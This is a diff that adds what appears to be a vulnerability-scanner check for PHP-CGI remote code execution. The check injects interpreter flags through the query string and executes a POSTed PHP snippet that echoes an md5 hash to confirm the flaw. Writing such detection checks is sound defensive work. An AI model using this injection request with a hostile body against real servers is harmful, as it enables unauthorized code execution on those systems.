@@ -1,0 +1,114 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+var lastJob = null;
+var reported = false;
+// **************************************************************************************							 
+function alert(uri)
+{	
+	var vxml = 'PHP_CGI_RCE.xml'; 
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(lastJob);
+    reported = true;
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testonURI(uri)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";		
+	lastJob.request.addHeader("Content-Type", "x/y", true);
+	
+	lastJob.request.body = '<?php echo(md5(acunetix-php-cgi-rce)); ?>';
+	
+	lastJob.execute();
+	
+	return (!lastJob.wasError && lastJob.response.body.indexOf("cfcd208495d565ef66e7dff9f98764da") != -1);
+}
+/***********************************************************************************/
+function findPHPFile(list)
+{	
+    var found = false;
+	for (var i=0;i<list.count; i++){			
+		var sf = list.getFile(i);		
+		
+		if(sf.isFile && !sf.notFound && !sf.ignored && sf.scanSiteFile)
+		{
+            // obvious .php, .php3, ...
+            if(sf.name.endsWith(".php") || sf.name.endsWith(".php3") || sf.name.endsWith(".php4") || sf.name.endsWith(".php5")) {
+                found = true;
+                if (testonURI(sf.fullPath)) {                    
+                    alert(sf.fullPath);
+                    break;
+                }
+            }                            
+            else 
+            // X-Powered-By: PHP
+            if(sf.response.headerValue('X-Powered-By').match(/PHP\//) != null) {
+                found = true;
+                if (testonURI(sf.fullPath)) {                    
+                    alert(sf.fullPath);
+                    break;
+                }
+            }
+		}	
+	}
+    
+    // still not found. try on first file with some schemes
+    if (!found) {
+    	for (var i=0;i<list.count; i++){			
+    		var sf = list.getFile(i);		
+    		if(sf.isFile && !sf.notFound && !sf.ignored && sf.scanSiteFile && sf.schemeCount > 0)
+    		{
+                found = true;
+                if (testonURI(sf.fullPath)) {                    
+                    alert(sf.fullPath);
+                    break;
+                }
+                break;
+    		}	
+	    }
+    }
+    
+    // still not found. try on first file
+    if (!found) {
+    	for (var i=0;i<list.count; i++){			
+    		var sf = list.getFile(i);		
+    		if(sf.isFile && !sf.notFound && !sf.ignored && sf.scanSiteFile)
+    		{
+                found = true;
+                if (testonURI(sf.fullPath)) {                    
+                    alert(sf.fullPath);
+                    break;
+                }
+                break;
+    		}	
+	    }
+    }
+    
+    // if not reported try on root
+    if (!reported) {
+        if (testonURI("/")) {                    
+            alert(sf.fullPath);
+        }
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+// don't test on our test sites
+if (scanURL.host.indexOf(".vulnweb.com") == -1)  {
+	var testedPHPCGIRCE = getGlobalValue("testedPHPCGIRCE");
+	if (!testedPHPCGIRCE)
+	{
+	    setGlobalValue("testedPHPCGIRCE", 1, true);
+	    
+		var list = getNewFiles(loadHttp);
+		findPHPFile(list);    
+	}
+}
